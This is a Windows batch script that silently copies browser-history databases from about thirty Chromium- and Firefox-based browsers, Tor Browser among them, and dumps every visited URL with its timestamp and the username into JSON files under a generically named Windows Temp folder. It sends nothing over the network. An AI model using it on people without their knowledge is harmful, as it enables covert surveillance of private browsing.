@echo off
setlocal enabledelayedexpansion

:: Quiet mode - suppress all output to console
>nul 2>&1 (
    echo [%date% %time%] === Browser History Collection Started === > "C:\Windows\Temp\browser_history_bat.log"
    echo User: %USERNAME% >> "C:\Windows\Temp\browser_history_bat.log"
    echo Computer: %COMPUTERNAME% >> "C:\Windows\Temp\browser_history_bat.log"
)

:: Set output directory
set "OUTPUT_DIR=C:\Windows\Temp\SystemInfoCollect"
set "TEMP_DIR=%TEMP%"

>> "C:\Windows\Temp\browser_history_bat.log" (
    echo Output directory: !OUTPUT_DIR!
    echo Temp directory: !TEMP_DIR!
)

:: Create output directory if not exists
if not exist "!OUTPUT_DIR!\" (
    mkdir "!OUTPUT_DIR!" >nul 2>&1
    if !errorlevel! equ 0 (
        echo [%date% %time%] Created output directory: !OUTPUT_DIR! >> "C:\Windows\Temp\browser_history_bat.log"
    ) else (
        echo [%date% %time%] ERROR: Cannot create output directory >> "C:\Windows\Temp\browser_history_bat.log"
        set "OUTPUT_DIR=%TEMP%\SystemInfoCollect"
        mkdir "!OUTPUT_DIR!" >nul 2>&1
        echo [%date% %time%] Using fallback directory: !OUTPUT_DIR! >> "C:\Windows\Temp\browser_history_bat.log"
    )
)

:: Find SQLite
set "SQLITE_PATH="
for %%P in (
    "C:\Windows\System32\sqlite3.exe"
    "C:\tools\sqlite3.exe"
    "C:\Program Files\SQLite\sqlite3.exe"
    "C:\Program Files (x86)\SQLite\sqlite3.exe"
    "sqlite3.exe"
) do (
    if exist %%P (
        set "SQLITE_PATH=%%P"
        echo [%date% %time%] Found SQLite at: !SQLITE_PATH! >> "C:\Windows\Temp\browser_history_bat.log"
        goto :sqlite_found
    )
)

echo [%date% %time%] ERROR: SQLite not found >> "C:\Windows\Temp\browser_history_bat.log"
goto :cleanup

:sqlite_found

:: Process Chrome-based browsers
echo [%date% %time%] Processing Chrome-based browsers >> "C:\Windows\Temp\browser_history_bat.log"

:: Chrome
set "CHROME_HISTORY=%USERPROFILE%\AppData\Local\Google\Chrome\User Data\Default\History"
call :process_browser "chrome" "!CHROME_HISTORY!"

:: Edge
set "EDGE_HISTORY=%USERPROFILE%\AppData\Local\Microsoft\Edge\User Data\Default\History"
call :process_browser "edge" "!EDGE_HISTORY!"

:: Opera
set "OPERA_HISTORY=%USERPROFILE%\AppData\Roaming\Opera Software\Opera Stable\History"
call :process_browser "opera" "!OPERA_HISTORY!"

:: Opera GX
set "OPERAGX_HISTORY=%USERPROFILE%\AppData\Roaming\Opera Software\Opera GX Stable\History"
call :process_browser "operagx" "!OPERAGX_HISTORY!"

:: Brave
set "BRAVE_HISTORY=%USERPROFILE%\AppData\Local\BraveSoftware\Brave-Browser\User Data\Default\History"
call :process_browser "brave" "!BRAVE_HISTORY!"

:: Vivaldi
set "VIVALDI_HISTORY=%USERPROFILE%\AppData\Local\Vivaldi\User Data\Default\History"
call :process_browser "vivaldi" "!VIVALDI_HISTORY!"

:: Vivaldi Snapshot
set "VIVALDI_SNAPSHOT_HISTORY=%USERPROFILE%\AppData\Local\Vivaldi\User Data\Default\History"
call :process_browser "vivaldi_snapshot" "!VIVALDI_SNAPSHOT_HISTORY!"

:: Yandex
set "YANDEX_HISTORY=%USERPROFILE%\AppData\Local\Yandex\YandexBrowser\User Data\Default\History"
call :process_browser "yandex" "!YANDEX_HISTORY!"

:: Chromium
set "CHROMIUM_HISTORY=%USERPROFILE%\AppData\Local\Chromium\User Data\Default\History"
call :process_browser "chromium" "!CHROMIUM_HISTORY!"

:: Avast
set "AVAST_HISTORY=%USERPROFILE%\AppData\Local\AVAST Software\Browser\User Data\Default\History"
call :process_browser "avast" "!AVAST_HISTORY!"

:: Comodo Dragon
set "COMODO_HISTORY=%USERPROFILE%\AppData\Local\Comodo\Dragon\User Data\Default\History"
call :process_browser "comodo" "!COMODO_HISTORY!"

:: Cent Browser
set "CENTBROWSER_HISTORY=%USERPROFILE%\AppData\Local\CentBrowser\User Data\Default\History"
call :process_browser "centbrowser" "!CENTBROWSER_HISTORY!"

:: Orbitum
set "ORBITUM_HISTORY=%USERPROFILE%\AppData\Local\Orbitum\User Data\Default\History"
call :process_browser "orbitum" "!ORBITUM_HISTORY!"

:: UR Browser
set "UR_HISTORY=%USERPROFILE%\AppData\Local\UR Browser\User Data\Default\History"
call :process_browser "ur" "!UR_HISTORY!"

:: Torch
set "TORCH_HISTORY=%USERPROFILE%\AppData\Local\Torch\User Data\Default\History"
call :process_browser "torch" "!TORCH_HISTORY!"

:: Epic Privacy Browser
set "EPIC_HISTORY=%USERPROFILE%\AppData\Local\Epic Privacy Browser\User Data\Default\History"
call :process_browser "epic_privacy_browser" "!EPIC_HISTORY!"

:: Slimjet
set "SLIMJET_HISTORY=%USERPROFILE%\AppData\Local\Slimjet\User Data\Default\History"
call :process_browser "slimjet" "!SLIMJET_HISTORY!"

:: Kometa
set "KOMETA_HISTORY=%USERPROFILE%\AppData\Local\Kometa\User Data\Default\History"
call :process_browser "kometa" "!KOMETA_HISTORY!"

:: SRWare Iron
set "IRON_HISTORY=%USERPROFILE%\AppData\Local\SRWare Iron\User Data\Default\History"
call :process_browser "srware_iron" "!IRON_HISTORY!"

:: Maxthon (Chrome-based)
set "MAXTHON_HISTORY=%USERPROFILE%\AppData\Local\Maxthon\User Data\Default\History"
call :process_browser "maxthon" "!MAXTHON_HISTORY!"

:: Maxthon5 (different path)
set "MAXTHON5_HISTORY=%USERPROFILE%\AppData\Local\Maxthon5\User Data\Default\History.db"
call :process_browser "maxthon5" "!MAXTHON5_HISTORY!"

:: Sleipnir
set "SLEIPNIR_HISTORY=%USERPROFILE%\AppData\Local\Fenrir Inc\Sleipnir5\Browser\Profiles\Default\History"
call :process_browser "sleipnir" "!SLEIPNIR_HISTORY!"

:: Process Firefox-based browsers
echo [%date% %time%] Processing Firefox-based browsers >> "C:\Windows\Temp\browser_history_bat.log"

:: Standard Firefox
set "FIREFOX_PROFILES=%USERPROFILE%\AppData\Roaming\Mozilla\Firefox\Profiles"
if exist "!FIREFOX_PROFILES!\" (
    for /d %%D in ("!FIREFOX_PROFILES!\*") do (
        set "PROFILE_PATH=%%D\places.sqlite"
        if exist "!PROFILE_PATH!" (
            set "PROFILE_NAME=%%~nxD"
            echo [%date% %time%] Found Firefox profile: !PROFILE_NAME! >> "C:\Windows\Temp\browser_history_bat.log"
            call :process_firefox "!PROFILE_NAME!" "!PROFILE_PATH!" "firefox"
        )
    )
) else (
    echo [%date% %time%] Firefox profiles not found >> "C:\Windows\Temp\browser_history_bat.log"
)

:: Waterfox
set "WATERFOX_PROFILES=%USERPROFILE%\AppData\Roaming\Waterfox\Profiles"
if exist "!WATERFOX_PROFILES!\" (
    for /d %%D in ("!WATERFOX_PROFILES!\*") do (
        set "PROFILE_PATH=%%D\places.sqlite"
        if exist "!PROFILE_PATH!" (
            set "PROFILE_NAME=%%~nxD"
            echo [%date% %time%] Found Waterfox profile: !PROFILE_NAME! >> "C:\Windows\Temp\browser_history_bat.log"
            call :process_firefox "!PROFILE_NAME!" "!PROFILE_PATH!" "waterfox"
        )
    )
) else (
    echo [%date% %time%] Waterfox profiles not found >> "C:\Windows\Temp\browser_history_bat.log"
)

:: Pale Moon
set "PALEMOON_PROFILES=%USERPROFILE%\AppData\Roaming\Moonchild Productions\Pale Moon\Profiles"
if exist "!PALEMOON_PROFILES!\" (
    for /d %%D in ("!PALEMOON_PROFILES!\*") do (
        set "PROFILE_PATH=%%D\places.sqlite"
        if exist "!PROFILE_PATH!" (
            set "PROFILE_NAME=%%~nxD"
            echo [%date% %time%] Found Pale Moon profile: !PROFILE_NAME! >> "C:\Windows\Temp\browser_history_bat.log"
            call :process_firefox "!PROFILE_NAME!" "!PROFILE_PATH!" "palemoon"
        )
    )
) else (
    echo [%date% %time%] Pale Moon profiles not found >> "C:\Windows\Temp\browser_history_bat.log"
)

:: LibreWolf
set "LIBREWOLF_PROFILES=%USERPROFILE%\AppData\Roaming\LibreWolf\Profiles"
if exist "!LIBREWOLF_PROFILES!\" (
    for /d %%D in ("!LIBREWOLF_PROFILES!\*") do (
        set "PROFILE_PATH=%%D\places.sqlite"
        if exist "!PROFILE_PATH!" (
            set "PROFILE_NAME=%%~nxD"
            echo [%date% %time%] Found LibreWolf profile: !PROFILE_NAME! >> "C:\Windows\Temp\browser_history_bat.log"
            call :process_firefox "!PROFILE_NAME!" "!PROFILE_PATH!" "librewolf"
        )
    )
) else (
    echo [%date% %time%] LibreWolf profiles not found >> "C:\Windows\Temp\browser_history_bat.log"
)

:: SeaMonkey
set "SEAMONKEY_PROFILES=%USERPROFILE%\AppData\Roaming\Mozilla\SeaMonkey\Profiles"
if exist "!SEAMONKEY_PROFILES!\" (
    for /d %%D in ("!SEAMONKEY_PROFILES!\*") do (
        set "PROFILE_PATH=%%D\places.sqlite"
        if exist "!PROFILE_PATH!" (
            set "PROFILE_NAME=%%~nxD"
            echo [%date% %time%] Found SeaMonkey profile: !PROFILE_NAME! >> "C:\Windows\Temp\browser_history_bat.log"
            call :process_firefox "!PROFILE_NAME!" "!PROFILE_PATH!" "seamonkey"
        )
    )
) else (
    echo [%date% %time%] SeaMonkey profiles not found >> "C:\Windows\Temp\browser_history_bat.log"
)

:: Tor Browser (fixed path)
set "TOR_HISTORY=%USERPROFILE%\AppData\Roaming\Tor Browser\Browser\TorBrowser\Data\Browser\profile.default\places.sqlite"
if exist "!TOR_HISTORY!" (
    echo [%date% %time%] Found Tor Browser profile >> "C:\Windows\Temp\browser_history_bat.log"
    call :process_firefox "default" "!TOR_HISTORY!" "tor"
) else (
    echo [%date% %time%] Tor Browser profile not found >> "C:\Windows\Temp\browser_history_bat.log"
)

:: Special case for Internet Explorer (WebCacheV01.dat)
echo [%date% %time%] Processing Internet Explorer >> "C:\Windows\Temp\browser_history_bat.log"
set "IE_CACHE=%USERPROFILE%\AppData\Local\Microsoft\Windows\WebCache\WebCacheV01.dat"
if exist "!IE_CACHE!" (
    echo [%date% %time%] Found IE WebCache file >> "C:\Windows\Temp\browser_history_bat.log"
    call :process_ie "microsoft_internet_explorer" "!IE_CACHE!"
) else (
    echo [%date% %time%] IE WebCache not found >> "C:\Windows\Temp\browser_history_bat.log"
)

:cleanup
:: Cleanup temporary files
echo [%date% %time%] Cleaning up temporary files >> "C:\Windows\Temp\browser_history_bat.log"
for %%F in ("%TEMP%\*_temp_*.db") do (
    if exist %%F (
        del /f /q "%%F" >nul 2>&1
        if !errorlevel! equ 0 (
            echo [%date% %time%] Deleted: %%F >> "C:\Windows\Temp\browser_history_bat.log"
        )
    )
)

for %%F in ("%TEMP%\*_temp_output.txt") do (
    if exist %%F (
        del /f /q "%%F" >nul 2>&1
    )
)

echo [%date% %time%] === Browser History Collection Completed === >> "C:\Windows\Temp\browser_history_bat.log"

endlocal
goto :eof

:: Function to process Chrome-based browsers
:process_browser
set "BROWSER_NAME=%~1"
set "HISTORY_PATH=%~2"
set "OUTPUT_FILE=!OUTPUT_DIR!\!BROWSER_NAME!_history.json"

echo [%date% %time%] Processing !BROWSER_NAME! >> "C:\Windows\Temp\browser_history_bat.log"

if not exist "!HISTORY_PATH!" (
    echo [%date% %time%] History file not found: !HISTORY_PATH! >> "C:\Windows\Temp\browser_history_bat.log"
    goto :eof
)

:: Create temporary copy of database
set "TEMP_DB=%TEMP%\!BROWSER_NAME!_temp_%RANDOM%.db"
copy "!HISTORY_PATH!" "!TEMP_DB!" >nul 2>&1

if !errorlevel! neq 0 (
    echo [%date% %time%] ERROR: Cannot copy database for !BROWSER_NAME! >> "C:\Windows\Temp\browser_history_bat.log"
    goto :eof
)

echo [%date% %time%] Created temp database: !TEMP_DB! >> "C:\Windows\Temp\browser_history_bat.log"

:: Execute SQL query
set "SQL_QUERY=SELECT datetime(last_visit_time/1000000-11644473600,'unixepoch'), url FROM urls ORDER BY last_visit_time ASC;"
"!SQLITE_PATH!" "!TEMP_DB!" "!SQL_QUERY!" > "!TEMP_DIR!\!BROWSER_NAME!_temp_output.txt" 2>nul

if !errorlevel! neq 0 (
    echo [%date% %time%] ERROR: SQL query failed for !BROWSER_NAME! >> "C:\Windows\Temp\browser_history_bat.log"
    goto :cleanup_browser
)

:: Process output and create JSONL (one JSON object per line)
set "ENTRY_COUNT=0"

for /f "tokens=1,2 delims=|" %%A in ('type "!TEMP_DIR!\!BROWSER_NAME!_temp_output.txt"') do (
    set "TIMESTAMP=%%A"
    set "URL=%%B"
    
    :: Basic validation
    if not "!TIMESTAMP!"=="" if not "!URL!"=="" (
        if "!TIMESTAMP!" geq "2000" (
            :: Create JSON object in one line
            set "JSON_OBJECT={"url_time":"!TIMESTAMP!","url_address":"!URL!","url_user":"%USERNAME%","url_browser":"!BROWSER_NAME!"}"
            
            :: Append to file
            echo !JSON_OBJECT! >> "!OUTPUT_FILE!"
            set /a ENTRY_COUNT+=1
        )
    )
)

echo [%date% %time%] Added !ENTRY_COUNT! entries for !BROWSER_NAME! >> "C:\Windows\Temp\browser_history_bat.log"

:cleanup_browser
:: Cleanup temporary files for this browser
if exist "!TEMP_DB!" del /f /q "!TEMP_DB!" >nul 2>&1
if exist "!TEMP_DIR!\!BROWSER_NAME!_temp_output.txt" del /f /q "!TEMP_DIR!\!BROWSER_NAME!_temp_output.txt" >nul 2>&1

goto :eof

:: Function to process Firefox-based browsers
:process_firefox
set "PROFILE_NAME=%~1"
set "PROFILE_PATH=%~2"
set "BROWSER_TYPE=%~3"

:: Clean profile name for filename
set "CLEAN_NAME=!PROFILE_NAME!"
set "CLEAN_NAME=!CLEAN_NAME:.default-release=!"
set "CLEAN_NAME=!CLEAN_NAME:.default=!"
set "CLEAN_NAME=!CLEAN_NAME: =_!"
set "CLEAN_NAME=!CLEAN_NAME:.=_!"

if "!CLEAN_NAME!"=="" set "CLEAN_NAME=default"

set "BROWSER_NAME=!BROWSER_TYPE!_!CLEAN_NAME!"
set "OUTPUT_FILE=!OUTPUT_DIR!\!BROWSER_NAME!_history.json"

echo [%date% %time%] Processing !BROWSER_TYPE! profile: !PROFILE_NAME! as !BROWSER_NAME! >> "C:\Windows\Temp\browser_history_bat.log"

:: Create temporary copy of database
set "TEMP_DB=%TEMP%\!BROWSER_NAME!_temp_%RANDOM%.db"
copy "!PROFILE_PATH!" "!TEMP_DB!" >nul 2>&1

if !errorlevel! neq 0 (
    echo [%date% %time%] ERROR: Cannot copy !BROWSER_TYPE! database for !PROFILE_NAME! >> "C:\Windows\Temp\browser_history_bat.log"
    goto :eof
)

echo [%date% %time%] Created temp !BROWSER_TYPE! database: !TEMP_DB! >> "C:\Windows\Temp\browser_history_bat.log"

:: Execute SQL query for Firefox
set "SQL_QUERY=SELECT datetime(moz_historyvisits.visit_date/1000000,'unixepoch'), moz_places.url FROM moz_places JOIN moz_historyvisits ON moz_places.id = moz_historyvisits.place_id ORDER BY moz_historyvisits.visit_date ASC;"
"!SQLITE_PATH!" "!TEMP_DB!" "!SQL_QUERY!" > "!TEMP_DIR!\!BROWSER_NAME!_temp_output.txt" 2>nul

if !errorlevel! neq 0 (
    echo [%date% %time%] ERROR: !BROWSER_TYPE! SQL query failed for !PROFILE_NAME! >> "C:\Windows\Temp\browser_history_bat.log"
    goto :cleanup_firefox
)

:: Process output and create JSONL (one JSON object per line)
set "ENTRY_COUNT=0"

for /f "tokens=1,2 delims=|" %%A in ('type "!TEMP_DIR!\!BROWSER_NAME!_temp_output.txt"') do (
    set "TIMESTAMP=%%A"
    set "URL=%%B"
    
    :: Basic validation
    if not "!TIMESTAMP!"=="" if not "!URL!"=="" (
        if "!TIMESTAMP!" geq "2000" (
            :: Create JSON object in one line
            set "JSON_OBJECT={"url_time":"!TIMESTAMP!","url_address":"!URL!","url_user":"%USERNAME%","url_browser":"!BROWSER_NAME!"}"
            
            :: Append to file
            echo !JSON_OBJECT! >> "!OUTPUT_FILE!"
            set /a ENTRY_COUNT+=1
        )
    )
)

echo [%date% %time%] Added !ENTRY_COUNT! entries for !BROWSER_TYPE! profile !BROWSER_NAME! >> "C:\Windows\Temp\browser_history_bat.log"

:cleanup_firefox
:: Cleanup temporary files for Firefox-based browser
if exist "!TEMP_DB!" del /f /q "!TEMP_DB!" >nul 2>&1
if exist "!TEMP_DIR!\!BROWSER_NAME!_temp_output.txt" del /f /q "!TEMP_DIR!\!BROWSER_NAME!_temp_output.txt" >nul 2>&1

goto :eof

:: Function to process Internet Explorer (placeholder - requires special tools)
:process_ie
set "BROWSER_NAME=%~1"
set "CACHE_PATH=%~2"
set "OUTPUT_FILE=!OUTPUT_DIR!\!BROWSER_NAME!_history.json"

echo [%date% %time%] Processing Internet Explorer - special handling required >> "C:\Windows\Temp\browser_history_bat.log"

:: IE WebCache requires special tools like ESEDatabaseView or NirSoft BrowsingHistoryView
:: For now, just create a JSONL file with note
echo {"note":"IE history requires special tools for extraction","user":"%USERNAME%","browser":"!BROWSER_NAME!"} > "!OUTPUT_FILE!"

echo [%date% %time%] IE processing completed (manual extraction required) >> "C:\Windows\Temp\browser_history_bat.log"

goto :eof
